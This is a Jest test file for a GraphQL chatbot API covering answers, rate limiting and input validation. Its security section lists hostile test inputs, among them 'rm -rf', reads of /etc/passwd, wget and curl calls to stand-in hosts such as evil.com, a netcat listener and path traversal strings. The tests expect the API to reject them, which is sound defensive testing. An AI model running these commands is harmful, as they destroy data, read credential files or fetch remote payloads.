import * as dbHandler from '../helpers/dbHandler';
import { executeOperation } from '../helpers/testServer';
import User, { UserRole } from '../../models/User';
import ChatMessage from '../../models/ChatMessage';
import jwt from 'jsonwebtoken';
import config from '../../config/config';
import bcrypt from 'bcryptjs';
import { connectRedis, disconnectRedis, getRedisClient } from '../../services/redis';
import { rateLimiter } from '../../services/rateLimiter';

// Mock OpenAI service
jest.mock('../../services/openai', () => ({
  chatWithAI: jest.fn().mockResolvedValue('This is a mock AI response'),
}));

// Define test queries and mutations
const ASK_QUESTION_MUTATION = `
  mutation AskQuestion($question: String!) {
    askQuestion(question: $question) {
      message {
        id
        question
        answer
        modelUsed
      }
      rateLimitInfo {
        limit
        remaining
        resetTime
      }
    }
  }
`;

// Define the expected types for our GraphQL responses
interface ChatMessageType {
  id: string;
  question: string;
  answer: string;
  modelUsed: string;
}

interface RateLimitInfo {
  limit: number;
  remaining: number;
  resetTime: string;
}

interface AskQuestionResponse {
  message: ChatMessageType;
  rateLimitInfo: RateLimitInfo;
}

// Type guard function to check if an object matches our expected structure
function isAskQuestionResponse(obj: any): obj is { askQuestion: AskQuestionResponse } {
  return (
    obj &&
    typeof obj === 'object' &&
    'askQuestion' in obj &&
    typeof obj.askQuestion === 'object' &&
    obj.askQuestion !== null &&
    'message' in obj.askQuestion &&
    'rateLimitInfo' in obj.askQuestion
  );
}

describe('Chatbot Resolvers', () => {
  let testUser: any;
  let authToken: string;
  
  // Connect to database and Redis before tests
  beforeAll(async () => {
    await dbHandler.connect();
    await connectRedis();
    
    // Create a test user
    const passwordHash = await bcrypt.hash('Test1234!', 10);
    testUser = await User.create({
      name: 'Test User',
      email: 'test@example.com',
      password: passwordHash,
      role: UserRole.USER
    });
    
    // Generate auth token
    authToken = jwt.sign(
      { userId: testUser._id, role: testUser.role },
      config.jwtSecret,
      { expiresIn: '1h' }
    );
    
    // Clear any existing rate limit data
    const redisClient = getRedisClient();
    await redisClient.flushDb();
  });
  
  // Disconnect after tests
  afterAll(async () => {
    await dbHandler.closeDatabase();
    await disconnectRedis();
  });
  
  it('should successfully ask a question and get a response', async () => {
    const variables = {
      question: 'What is the meaning of life?'
    };
    
    const context = { user: { id: testUser._id, role: testUser.role } };
    
    const response = await executeOperation(ASK_QUESTION_MUTATION, variables, context);
    
    // Check no errors occurred
    expect(response.body.kind).toBe('single');
    
    if (response.body.kind === 'single') {
      const { data, errors } = response.body.singleResult;
      
      expect(errors).toBeUndefined();
      expect(data).toBeDefined();
      
      // Validate that data has the expected structure using our type guard
      expect(isAskQuestionResponse(data)).toBe(true);
      
      if (isAskQuestionResponse(data)) {
        // Now TypeScript knows data has the right structure
        const { askQuestion } = data;
        
        // Check message properties
        expect(askQuestion.message.question).toBe(variables.question);
        expect(askQuestion.message.answer).toBe('This is a mock AI response');
        expect(askQuestion.message.modelUsed).toBe('gpt-3.5-turbo');
        
        // Check rate limit info
        expect(askQuestion.rateLimitInfo.limit).toBe(5); // Using the actual value from config
        expect(askQuestion.rateLimitInfo.remaining).toBe(4);
        expect(askQuestion.rateLimitInfo.resetTime).toBeTruthy();
      }
      
      // Check message was saved to database
      const messageInDb = await ChatMessage.findOne({ question: variables.question });
      expect(messageInDb).toBeTruthy();
      expect(messageInDb?.answer).toBe('This is a mock AI response');
    }
  });
  
  it('should enforce rate limiting after reaching the limit', async () => {
    const variables = {
      question: 'Another test question'
    };
    
    const context = { user: { id: testUser._id, role: testUser.role } };
    
    // Simulate hitting the rate limit by making multiple requests
    const limit = 5; // Match the actual limit in the environment
    
    for (let i = 0; i < limit; i++) {
      await executeOperation(ASK_QUESTION_MUTATION, variables, context);
    }
    
    // This request should be rate limited
    const response = await executeOperation(ASK_QUESTION_MUTATION, variables, context);
    
    expect(response.body.kind).toBe('single');
    
    if (response.body.kind === 'single') {
      const { errors } = response.body.singleResult;
      expect(errors).toBeDefined();
      expect(errors?.[0].message).toContain('Rate limit exceeded');
      expect(errors?.[0].extensions?.code).toBe('RATE_LIMITED');
    }
  });

  describe('Input Validation - Security Patterns', () => {
    let freshUser: any;
    let freshToken: string;

    beforeAll(async () => {
      // Create a fresh user for security tests to avoid rate limit issues
      const passwordHash = await bcrypt.hash('Test1234!', 10);
      freshUser = await User.create({
        name: 'Security Test User',
        email: 'security@example.com',
        password: passwordHash,
        role: UserRole.USER
      });
      
      // Clear rate limits for this user using the correct prefixed key
      await rateLimiter.reset(`chatbot:${freshUser._id}`);
    });

    const dangerousInputs = [
      { input: 'cd /tmp; rm -rf *', reason: 'shell semicolon' },
      { input: 'test | cat /etc/passwd', reason: 'pipe operator' },
      { input: 'hello && wget http://evil.com', reason: 'AND operator with wget' },
      { input: '$(cat /etc/passwd)', reason: 'command substitution' },
      { input: 'test `whoami`', reason: 'backtick execution' },
      { input: 'look at ../../../etc/passwd', reason: 'path traversal' },
      { input: 'curl http://malware.com/payload', reason: 'curl with URL' },
      { input: 'curl -X POST http://evil.com', reason: 'curl with flags' },
      { input: 'bash -c "rm -rf /"', reason: 'bash execution context' },
      { input: 'python -c "import os"', reason: 'python execution context' },
      { input: 'perl -e "system(cmd)"', reason: 'perl one-liner' },
      { input: 'eval(malicious)', reason: 'eval function' },
      { input: 'exec(command)', reason: 'exec function' },
      { input: 'test%00null', reason: 'null byte injection' },
      { input: 'path%2f%2e%2e%2fetc', reason: 'URL-encoded traversal' },
      { input: 'wget http://evil.com/malware', reason: 'wget download' },
      { input: 'chmod 777 /etc/passwd', reason: 'chmod with permissions' },
      { input: 'nc -lvp 4444', reason: 'netcat listener' },
    ];

    it.each(dangerousInputs)(
      'should reject input containing $reason',
      async ({ input }) => {
        const context = { user: { id: freshUser._id, role: freshUser.role } };
        const response = await executeOperation(
          ASK_QUESTION_MUTATION,
          { question: input },
          context
        );

        expect(response.body.kind).toBe('single');
        if (response.body.kind === 'single') {
          const { errors, data } = response.body.singleResult;
          // Dangerous input should be rejected - either by validation or shield
          expect(errors).toBeDefined();
          // The request should fail (no successful data)
          expect(data?.askQuestion).toBeFalsy();
        }
      }
    );

    const safeInputs = [
      'What programming languages do you know?',
      'Tell me about your experience with React',
      'How do you handle database connections?',
      'What is your approach to testing?',
      'Can you explain microservices architecture?',
      // Developer questions about technologies (should NOT be blocked)
      'What is your experience with Python?',
      'Can you explain bash scripting?',
      'Tell me about Perl regex',
      'How do you use curl for API testing?',
      'What is wget used for?',
      'Explain the eval function in JavaScript',
      'How does exec work in Node.js?',
      'What are chmod permissions?',
    ];

    it.each(safeInputs)(
      'should accept safe input: %s',
      async (question) => {
        // Clear rate limit before each safe input test using the correct prefixed key
        await rateLimiter.reset(`chatbot:${freshUser._id}`);
        
        const context = { user: { id: freshUser._id, role: freshUser.role } };
        const response = await executeOperation(
          ASK_QUESTION_MUTATION,
          { question },
          context
        );

        expect(response.body.kind).toBe('single');
        if (response.body.kind === 'single') {
          const { data, errors } = response.body.singleResult;
          // Should not have validation errors (may have rate limit errors which is fine)
          const hasValidationError = errors?.some(e => 
            e.message.includes('invalid characters or patterns')
          );
          expect(hasValidationError).toBeFalsy();
        }
      }
    );
  });
});
